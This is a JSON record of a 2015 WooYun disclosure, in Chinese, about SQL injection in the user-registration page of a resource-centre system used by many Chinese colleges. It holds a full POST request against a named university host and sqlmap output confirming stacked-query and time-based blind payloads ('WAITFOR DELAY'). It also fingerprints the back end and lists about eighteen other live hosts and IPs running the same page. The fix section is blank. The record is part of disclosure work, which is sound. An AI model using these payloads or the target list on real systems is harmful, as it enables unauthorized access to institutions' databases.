{"id": 33200, "wybug_id": "wooyun-2015-0109346", "wybug_title": "某通用型学习系统SQL注入", "wybug_corp": "中央广播电视大学现代远程教育", "wybug_author": "大象", "wybug_date": "2015-04-21 14:25", "wybug_open_date": "2015-07-23 14:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向公众公开  简要描述： RT 详细说明：  由中央广播电视大学现代远程教育开发的一套资源中心系统，众多高校在使用，之前有人提交过该系统的问题。\n WooYun: 某通用型学习系统存在sql盲注 \n随便看了下，还存在另一处注入。以\nhttp://nerc.hnrtu.edu.cn/frontend/member/register_setp3.aspx?type=person\n为例，用户注册处，用户名参数存在注入。\nPOST /frontend/member/register_setp3.aspx?type=person HTTP/1.1Host: nerc.hnrtu.edu.cnProxy-Connection: keep-aliveContent-Length: 948Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://nerc.hnrtu.edu.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://nerc.hnrtu.edu.cn/frontend/member/register_setp3.aspx?type=personAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: ASP.NET_SessionId=iwejufq25zhludj1hyb0jvne__VIEWSTATE=%2FwEPDwUKLTQwMTI5MDcyMQ9kFgJmD2QWFgIDDw8WAh4HVmlzaWJsZWhkFgICAw8WAh8AaGQCBQ8WAh8AaGQCBw9kFgRmD2QWAgIBDw9kFgIeB29uY2xpY2sFG3JldHVybiBDaGVja1JlZ1N1Ym1pdFRvcCgpO2QCAQ8WAh8AaGQCDQ8PZBYCHgpvbmtleXByZXNzBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCDw88KwAEAQAPFgQeBVZhbHVlBQM6aG4eDl8hVXNlVmlld1N0YXRlZ2RkAhEPD2QWAh8CBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCEw8PZBYCHwIFF0VudGVyVGV4dEJveCgnYnRuTmV4dCcpZAIVDw9kFgIfAgUXRW50ZXJUZXh0Qm94KCdidG5OZXh0JylkAhcPD2QWAh8CBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCGQ8PZBYCHwIFF0VudGVyVGV4dEJveCgnYnRuTmV4dCcpZAIbDw9kFgIfAQUYcmV0dXJuIENoZWNrUmVnU3VibWl0KCk7ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUSdWNfbG9naW4xJGJ0bkxvZ2lu5OUfpy%2FEwHm%2FVz%2FMsy9K0UiFE9E%3D&__VIEWSTATEGENERATOR=AD7A3F07&centerShortName1=%3Ahn&arrcity_3word=&arrcity=&txtAccountPassword=&txtAccount=admin1&txtPassword=admin1&txtPasswordConfirm=admin1&txtQuestion=admin&txtAnswer=admin&txtEmail=admin%4022.com&btnNext=%E4%B8%8B%E4%B8%80%E6%AD%A5\n\nPOST parameter 'txtAccount' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 87 HTTP(s) requests:---Place: POSTParameter: txtAccount    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKLTQwMTI5MDcyMQ9kFgJmD2QWFgIDDw8WAh4HVmlzaWJsZWhkFgICAw8WAh8AaGQCBQ8WAh8AaGQCBw9kFgRmD2QWAgIBDw9kFgIeB29uY2xpY2sFG3JldHVybiBDaGVja1JlZ1N1Ym1pdFRvcCgpO2QCAQ8WAh8AaGQCDQ8PZBYCHgpvbmtleXByZXNzBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCDw88KwAEAQAPFgQeBVZhbHVlBQM6aG4eDl8hVXNlVmlld1N0YXRlZ2RkAhEPD2QWAh8CBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCEw8PZBYCHwIFF0VudGVyVGV4dEJveCgnYnRuTmV4dCcpZAIVDw9kFgIfAgUXRW50ZXJUZXh0Qm94KCdidG5OZXh0JylkAhcPD2QWAh8CBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCGQ8PZBYCHwIFF0VudGVyVGV4dEJveCgnYnRuTmV4dCcpZAIbDw9kFgIfAQUYcmV0dXJuIENoZWNrUmVnU3VibWl0KCk7ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUSdWNfbG9naW4xJGJ0bkxvZ2lu5OUfpy/EwHm/Vz/Msy9K0UiFE9E=&__VIEWSTATEGENERATOR=AD7A3F07&centerShortName1=:hn&arrcity_3word=&arrcity=&txtAccountPassword=&txtAccount=admin1'; WAITFOR DELAY '0:0:5'--&txtPassword=admin1&txtPasswordConfirm=admin1&txtQuestion=admin&txtAnswer=admin&txtEmail=admin@22.com&btnNext=%E4%B8%8B%E4%B8%80%E6%AD%A5    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKLTQwMTI5MDcyMQ9kFgJmD2QWFgIDDw8WAh4HVmlzaWJsZWhkFgICAw8WAh8AaGQCBQ8WAh8AaGQCBw9kFgRmD2QWAgIBDw9kFgIeB29uY2xpY2sFG3JldHVybiBDaGVja1JlZ1N1Ym1pdFRvcCgpO2QCAQ8WAh8AaGQCDQ8PZBYCHgpvbmtleXByZXNzBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCDw88KwAEAQAPFgQeBVZhbHVlBQM6aG4eDl8hVXNlVmlld1N0YXRlZ2RkAhEPD2QWAh8CBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCEw8PZBYCHwIFF0VudGVyVGV4dEJveCgnYnRuTmV4dCcpZAIVDw9kFgIfAgUXRW50ZXJUZXh0Qm94KCdidG5OZXh0JylkAhcPD2QWAh8CBRdFbnRlclRleHRCb3goJ2J0bk5leHQnKWQCGQ8PZBYCHwIFF0VudGVyVGV4dEJveCgnYnRuTmV4dCcpZAIbDw9kFgIfAQUYcmV0dXJuIENoZWNrUmVnU3VibWl0KCk7ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUSdWNfbG9naW4xJGJ0bkxvZ2lu5OUfpy/EwHm/Vz/Msy9K0UiFE9E=&__VIEWSTATEGENERATOR=AD7A3F07&centerShortName1=:hn&arrcity_3word=&arrcity=&txtAccountPassword=&txtAccount=admin1' WAITFOR DELAY '0:0:5'--&txtPassword=admin1&txtPasswordConfirm=admin1&txtQuestion=admin&txtAnswer=admin&txtEmail=admin@22.com&btnNext=%E4%B8%8B%E4%B8%80%E6%AD%A5---[18:18:20] [INFO] testing Microsoft SQL Server[18:18:20] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y[18:18:29] [INFO] confirming Microsoft SQL Server[18:18:40] [INFO] adjusting time delay to 3 seconds due to good response times[18:18:41] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[18:18:41] [INFO] fetched data logged to text files under 'C:\\Users\\sith\\.sqlmap\\output\\nerc.hnrtu.edu.cn'\n\n\n   漏洞证明：  其他测试案例：\nhttp://nerc.szpt.edu.cn/frontend/member/register_setp3.aspx?type=personhttp://zy.cdrtvu.com/frontend/member/register_setp3.aspx?type=personhttp://210.28.225.145/frontend/member/register_setp3.aspx?type=personhttp://110.167.234.52/frontend/member/register_setp3.aspx?type=personhttp://xxzy.hekg.cn/frontend/member/register_setp3.aspx?type=personhttp://nerc.gdjmxx.com/frontend/member/register_setp3.aspx?type=personhttp://nerc.gzedu.com/frontend/member/register_setp3.aspx?type=personhttp://zyzx.whtvu.com.cn/FrontEnd/member/register_setp3.aspx?type=personhttp://222.91.161.219/FrontEnd/member/register_setp3.aspx?type=personhttp://resource.jsgyve.com/FrontEnd/member/register_setp3.aspx?type=personhttp://zyzx.shztvu.com:8002/FrontEnd/member/register_setp3.aspx?type=personhttp://210.28.216.240/FrontEnd/member/register_setp3.aspx?type=personhttp://learn.ybzy.cn/FrontEnd/member/register_setp3.aspx?type=personhttp://61.177.123.76/FrontEnd/member/register_setp3.aspx?type=personhttp://218.13.33.153/FrontEnd/member/register_setp3.aspx?type=personhttp://res.yxgcx.com:8080/FrontEnd/member/register_setp3.aspx?type=personhttp://nerc.szrtvu.com.cn/FrontEnd/member/register_setp3.aspx?type=personhttp://218.26.168.18/FrontEnd/member/register_setp3.aspx?type=person\n   修复方案：     版权声明：转载请注明来源 大象@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-04-24 14:18 厂商回复： CNVD未直接复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}